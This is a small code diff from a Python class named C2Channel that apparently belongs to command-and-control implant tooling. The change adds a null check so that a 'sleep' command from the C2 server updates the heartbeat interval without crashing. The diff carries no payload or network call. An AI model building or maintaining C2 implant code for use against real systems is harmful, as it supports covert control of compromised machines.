@@ -877,7 +877,8 @@ class C2Channel:
         """Handle commands from C2 server"""
         if response.command == "sleep":
             # Update sleep interval
-            new_interval = response.data.get("interval", 60)
+            data = response.data or {}
+            new_interval = data.get("interval", 60)
             if self.heartbeat:
                 self.heartbeat.update_interval(new_interval)
         
